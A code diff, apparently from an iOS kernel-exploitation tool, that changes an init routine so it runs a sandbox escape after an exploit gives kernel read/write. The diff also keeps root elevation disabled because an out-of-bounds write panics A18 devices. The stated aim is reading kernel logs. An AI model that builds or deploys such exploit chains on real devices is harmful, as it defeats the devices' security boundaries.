@@ -81,39 +81,8 @@ int KFInit(void) {
     g_exploit_committed = true;
     progress("Step 1/4: opa334 OK — kernel R/W established", "success");
 
-    // === KFLog v2 strategy: skip destructive Steps 2-4 on A18 ===
-    // Steps 2-4 (XPF, sandbox_escape, root_elevate) all rely on kernel writes
-    // that cause kernel panic on A18/iOS 18.4.1.
-    // The SCAN backend (pure-read msgbuf scanning) only needs kread64 from Step 1.
-    // We return here so KFLogInitFilter() can activate the SCAN backend immediately.
-    progress("Step 2/4: skipped (SCAN backend only needs kread64)", "dim");
-    progress("Step 3/4: skipped (not needed for log reading)", "dim");
-    progress("Step 4/4: skipped (OOB write causes kernel panic on A18)", "dim");
-
-    // Still collect basic process info for diagnostics
-    g_self_proc = proc_self();
-    if (g_self_proc) {
-        char buf[128];
-        snprintf(buf, sizeof(buf), "self proc: 0x%llx (log-only mode)", (unsigned long long)g_self_proc);
-        progress(buf, "dim");
-    }
-
-    g_initialized = true;
-    {
-        char buf[256];
-        snprintf(buf, sizeof(buf), "Init complete (log-only) | ready=%d root=%d sandbox=%d uid=%d",
-                 g_initialized, g_root, g_sandbox_escaped, getuid());
-        progress(buf, "success");
-    }
-    return 0;
-}
-
-// === The old Steps 2-4 are preserved below for future re-enabling ===
-// They are unreachable in the current build.
-#if 0
-    // Step 1.5: Resolve kernel symbols (msgbuf, etc.) via XPF
-    // This requires sandbox escape to read kernelcache from /private/preboot
-    // If it fails, log channel falls back to sysctl (often restricted on iOS)
+    // ===== Step 2: XPF symbol resolution (kernelcache) =====
+    // Pure read, no kernel writes. On failure just fall back to SCAN backend.
     progress("Step 2/4: XPF symbol resolution (kernelcache)...", "dim");
     int xpf_ret = init_xpf();
     if (xpf_ret == 0) {
@@ -123,57 +92,66 @@ int KFInit(void) {
         progress(buf, "success");
     } else {
         char buf[256];
-        snprintf(buf, sizeof(buf), "Step 2/4: XPF failed (%d) — log channel will use sysctl fallback", xpf_ret);
+        snprintf(buf, sizeof(buf), "Step 2/4: XPF failed (%d) — falling back to SCAN msgbuf scan", xpf_ret);
         progress(buf, "dim");
     }
 
-    // Step 3: Get current proc + sandbox escape
+    // ===== Step 3: proc_self + sandbox escape =====
+    // sandbox_escape writes proc ucred; on A18 it may fail but should not panic.
     progress("Step 3/4: proc_self + sandbox escape...", "dim");
     g_self_proc = proc_self();
     if (g_self_proc == 0) {
-        progress("proc_self() returned 0", "error");
-        return -2;
-    }
-    {
+        progress("proc_self() returned 0 — continuing without sandbox escape", "error");
+    } else {
         char buf[128];
         snprintf(buf, sizeof(buf), "self proc: 0x%llx", (unsigned long long)g_self_proc);
         progress(buf, "dim");
+
+        int sbx_ret = sandbox_escape(g_self_proc);
+        if (sbx_ret == 0) {
+            g_sandbox_escaped = true;
+            progress("Step 3/4: sandbox escape OK", "success");
+        } else {
+            char buf2[128];
+            snprintf(buf2, sizeof(buf2), "Step 3/4: sandbox_escape returned %d (continuing, SCAN doesn't need it)", sbx_ret);
+            progress(buf2, "dim");
+        }
     }
 
-    int sbx_ret = sandbox_escape(g_self_proc);
-    if (sbx_ret == 0) {
-        g_sandbox_escaped = true;
-        progress("Step 3/4: sandbox escape OK", "success");
-    } else {
-        char buf[128];
-        snprintf(buf, sizeof(buf), "sandbox_escape returned %d (continuing)", sbx_ret);
-        progress(buf, "dim");
-    }
+    // ===== Step 4: SKIP root elevation =====
+    // On A18/iOS 18.4.1, setsockopt OOB write in sandbox_elevate_to_root causes
+    // kernel page fault / panic. SCAN backend only needs kread64 from Step 1.
+    progress("Step 4/4: skipped — root elevation disabled (A18 kernel write causes panic)", "dim");
 
-    // Step 4: Elevate to root (from launchd ucred)
-    progress("Step 4/4: root elevation...", "dim");
-    int root_ret = sandbox_elevate_to_root(g_self_proc);
-    if (root_ret == 0) {
-        g_root = (getuid() == 0);
-        char buf[128];
-        snprintf(buf, sizeof(buf), "Step 4/4: root elevation OK (uid=%d)", getuid());
-        progress(buf, "success");
-    } else {
-        char buf[128];
-        snprintf(buf, sizeof(buf), "root elevation returned %d (uid=%d)", root_ret, getuid());
-        progress(buf, "dim");
+    // ===== Version / diagnostics summary =====
+    {
+        char model[64] = {0};
+        size_t mlen = sizeof(model);
+        sysctlbyname("hw.model", model, &mlen, NULL, 0);
+        char iosver[64] = {0};
+        size_t vlen = sizeof(iosver);
+        sysctlbyname("kern.osversion", iosver, &vlen, NULL, 0);
+        extern bool gIsA18Above;
+        extern uint64_t g_kernel_base;
+        char line[512];
+        snprintf(line, sizeof(line),
+                 "debug | dev=%s iOS=%s A18=%d kbase=0x%llx msgbufp=0x%llx msgsz=%lld",
+                 model, iosver, gIsA18Above ? 1 : 0,
+                 (unsigned long long)g_kernel_base,
+                 (unsigned long long)g_msgbufp_addr,
+                 (long long)g_msgbuf_size);
+        progress(line, "dim");
     }
 
     g_initialized = true;
     {
         char buf[256];
-        snprintf(buf, sizeof(buf), "Init complete | ready=%d root=%d sandbox=%d",
-                 g_initialized, g_root, g_sandbox_escaped);
+        snprintf(buf, sizeof(buf), "Init complete | ready=%d root=%d sandbox=%d uid=%d",
+                 g_initialized, g_root, g_sandbox_escaped, getuid());
         progress(buf, "success");
     }
     return 0;
 }
-#endif
 
 // ===== Module 1.5: Shutdown (prevents panic on exit) =====
 
